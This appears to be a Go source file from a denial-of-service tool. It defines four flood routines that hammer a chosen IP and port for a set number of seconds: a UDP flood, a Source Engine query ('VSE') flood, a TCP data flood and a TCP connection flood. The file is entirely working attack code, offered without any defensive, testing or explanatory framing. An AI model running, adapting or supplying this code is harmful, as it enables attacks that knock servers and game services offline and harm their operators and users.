package main

import (
	"fmt"
	"net"
	"time"
)

func udp_attack(ip string, port string, len int, times int) {
	fmt.Println(ip, port, len, times)
	target := ip + ":" + port
	nowtime := time.Now().Unix()

	endtime := nowtime + int64(times)
	conn, err := net.Dial("udp", target)
	if err != nil {
		return
	}
	for time.Now().Unix() < endtime {
		go func() {
			buf := make([]byte, len)
			conn.Write([]byte(buf))
		}()

	}
}

func vse_attack(ip string, port string, times int) {

	target := ip + ":" + port
	nowtime := time.Now().Unix()

	endtime := nowtime + int64(times)
	conn, err := net.Dial("udp", target)
	if err != nil {
		return
	}
	for time.Now().Unix() < endtime {
		go func() {
			payload := "\\xff\\xff\\xff\\xffTSource Engine Query\\x0"
			conn.Write([]byte(payload))
		}()

	}
}

func tcp_flood(ip string, port string, len int, times int) {
	fmt.Println(ip, port, times)
	target := ip + ":" + port
	nowtime := time.Now().Unix()
	conn, _ := net.Dial("tcp", target)
	endtime := nowtime + int64(times)

	for time.Now().Unix() < endtime {
		go func() {
			buf := make([]byte, len)
			conn.Write([]byte(buf))
		}()

	}
}

func tcp_normal_connect(ip string, port string, times int, connn int) {
	fmt.Println(ip, port, times)
	target := ip + ":" + port
	nowtime := time.Now().Unix()

	endtime := nowtime + int64(times)

	for time.Now().Unix() < endtime {
		for i := 0; i < connn; i++ {
			go net.Dial("tcp", target)
		}
		time.Sleep(2 * time.Second)
	}
}
